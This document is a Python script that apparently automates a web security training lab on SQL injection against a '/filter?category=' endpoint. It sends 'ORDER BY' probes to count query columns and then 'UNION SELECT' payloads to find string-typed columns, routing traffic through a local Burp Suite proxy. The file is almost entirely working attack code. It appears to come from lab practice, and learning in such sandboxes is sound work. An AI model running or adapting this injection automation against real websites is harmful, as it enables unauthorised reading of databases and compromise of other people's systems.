import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore

# Burp Suite proxy
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',  
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
}


def get_csrf_token(s, url, path):
    login_url = url + path
    r = s.get(login_url, headers=headers)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value'] # type: ignore
    return csrf

def login_acc(s, url, username, password):
    login_url = url + '/login'
    payload = {
        "csrf": get_csrf_token(s, url, '/login'),
        "username": username,
        "password": password
    }
    r = s.post(login_url, data=payload, headers=headers)

    if 'Log out' in r.text:
        print(f'Successful login {username} account')
        print('[+] Successful solved lab')
        sys.exit(0)
    else:
        print(f'[-] Fail to login {username} account')
        sys.exit(-1)

def get_hint_string(s, url):
    r = s.get(url)
    soup = BeautifulSoup(r.text, 'html.parser')
    hint_str = soup.find("p", {"id": "hint"}) # type: ignore
    if hint_str:
        return hint_str.get_text() # type: ignore
    return None

def is_num_col_equal(s, url, path, payload, num: int):
    sql_injection = f"'+ORDER+BY+{num}--%20"
    target_url = url + path + '?' + payload + sql_injection
    r = s.get(target_url)
    if r.status_code == 200:
        return True
    return False

def is_col_string(s, url, path, payload, isOracle, columns):
    sql_injection = f"'+UNION+SELECT+{',+'.join(columns)}+FROM+{'ALL_TABLES' if isOracle else 'information_schema.tables'}--%20"
    target_url = url + path + '?' + payload + sql_injection
    r = s.get(target_url)
    if r.status_code == 200:
        return True
    return False

def check_solved_lab(s, url):
    r = s.get(url)
    if "Congratulations, you solved the lab!" in r.text:
        print("[+] Successful solved lab")
        sys.exit(0)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1]

    PATH = '/filter'
    PAYLOAD = 'category=Gifts'
    IS_ORACLE = False

    num_column = 0
    for i in range(1, 20):
        if is_num_col_equal(s, url, PATH, PAYLOAD, i):
            num_column = i
        else: break
    print(f'[+] Finish test column, number of columns = {num_column}')

    columns = ['NULL'] * num_column
    str_col = []
    hint_str = get_hint_string(s, url)
    if hint_str:
        for i in range(num_column):
            columns[i] = f"'{hint_str[40:-1]}'"
            if is_col_string(s, url, PATH, PAYLOAD, IS_ORACLE, columns):
                str_col.append(i)
            columns[i] = 'NULL'
        print(f'[+] List of columns is string type: {str_col}')
        if not len(str_col):
            print('[-] This do not contain any string type column')
            return

    check_solved_lab(s, url)


if __name__ == '__main__':
    main()